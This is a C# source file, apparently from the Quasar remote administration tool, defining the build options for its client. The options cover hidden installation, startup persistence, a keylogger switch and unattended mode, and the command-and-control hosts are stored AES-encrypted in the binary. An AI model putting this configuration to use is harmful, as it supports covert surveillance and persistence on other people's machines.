using System;
using System.Collections.Generic;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using Newtonsoft.Json;
using Quasar.Common.Cryptography;
using Quasar.Common.Enums;
namespace Quasar.Common
{
    public class BuildOptions
    {
        #region CLIENT-ONLY
        public string EncryptionKey { get; set; }
        public string ServerSignature { get; set; }
        public string ServerCertificate { get; set; }
        public Environment.SpecialFolder SpecialFolder = Environment.SpecialFolder.ApplicationData;
        #endregion //CLIENT-ONLY

        #region SERVER-ONLY
        [JsonIgnore]
        public string[] AssemblyInformation { get; set; }
        [JsonIgnore]
        public string OutputPath { get; set; }
        [JsonIgnore]
        public short InstallPath { get; set; }
        #endregion //SERVER-ONLY


        public string Tag { get; set; }
        public string Mutex { get; set; }
        public string RawHosts { get; set; }
        public string IconPath { get; set; }
        public string Version { get; set; }
        public string InstallSub { get; set; }
        public string InstallName { get; set; }
        public string StartupName { get; set; }
        public string LogDirectoryName { get; set; }
        public bool Install { get; set; }
        public bool Startup { get; set; }
        public bool HideFile { get; set; }
        public bool Keylogger { get; set; }
        public int Delay { get; set; }
        public bool HideLogDirectory { get; set; }
        public bool HideInstallSubdirectory { get; set; }
        public bool UnattendedMode { get; set; }

        private void Decrypt()
        {
            var aes = new Aes256(EncryptionKey);
            Version = aes.Decrypt(Version);
            RawHosts = aes.Decrypt(RawHosts);
            InstallSub = aes.Decrypt(InstallSub);
            InstallName = aes.Decrypt(InstallName);
            Mutex = aes.Decrypt(Mutex);
            StartupName = aes.Decrypt(StartupName);
            Tag = aes.Decrypt(Tag);
            LogDirectoryName = aes.Decrypt(LogDirectoryName);
            ServerSignature = aes.Decrypt(ServerSignature);
            ServerCertificate = aes.Decrypt(ServerCertificate);

        }

        /// <summary>
        /// Export as a encrypted option"/>
        /// </summary>
        /// <param name="caCertificate"></param>
        /// <param name="serverCertificate"></param>
        /// <returns></returns>
        private BuildOptions Export(X509Certificate2 caCertificate)
        {
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
            var key = serverCertificate.Thumbprint;
            var aes = new Aes256(key);

            byte[] signature;
            using (var rsa = caCertificate.GetRSAPrivateKey())
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                signature = rsa.SignHash(hash, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            }
            var o=(BuildOptions)this.MemberwiseClone();
            o.EncryptionKey=key;
            o.Version = aes.Encrypt(Version);
            o.RawHosts=aes.Encrypt(RawHosts);
            o.InstallSub=aes.Encrypt(InstallSub);
            o.InstallName=aes.Encrypt(InstallName);
            o.Mutex=aes.Encrypt(Mutex);
            o.StartupName=aes.Encrypt(StartupName);
            o.Tag=aes.Encrypt(Tag);
            o.LogDirectoryName=aes.Encrypt(LogDirectoryName);
            o.ServerSignature=aes.Encrypt(Convert.ToBase64String(signature));
            o.ServerCertificate=aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
            o.SpecialFolder=(Environment.SpecialFolder)GetSpecialFolder(InstallPath);
            return o;
        }

        public byte[] ExportBinary(X509Certificate2 caCertificate)
        {
            return Encoding.UTF8.GetBytes(Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(Export(caCertificate), Formatting.None))));
        }

        /// <summary>
        /// Deserialise from hex string
        /// </summary>
        /// <param name="base64String"></param>
        /// <returns>An encrypted <see cref="ClientSettings"/> instance</returns>
        public static BuildOptions FromBinary(byte[] data)
        {
            var o= JsonConvert.DeserializeObject<BuildOptions>(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(data))));
            o.Decrypt();
            return o;
        }

        /// <summary>
        /// Attempts to obtain the signed-byte value of a special folder from the install path value provided.
        /// </summary>
        /// <param name="installPath">The integer value of the install path.</param>
        /// <returns>Returns the signed-byte value of the special folder.</returns>
        /// <exception cref="ArgumentException">Thrown if the path to the special folder was invalid.</exception>
        private sbyte GetSpecialFolder(int installPath)
        {
            switch (installPath)
            {
                case 1:
                    return (sbyte)Environment.SpecialFolder.ApplicationData;
                case 2:
                    return (sbyte)Environment.SpecialFolder.ProgramFiles;
                case 3:
                    return (sbyte)Environment.SpecialFolder.System;
                default:
                    throw new ArgumentException("InstallPath");
            }
        }
    }
}
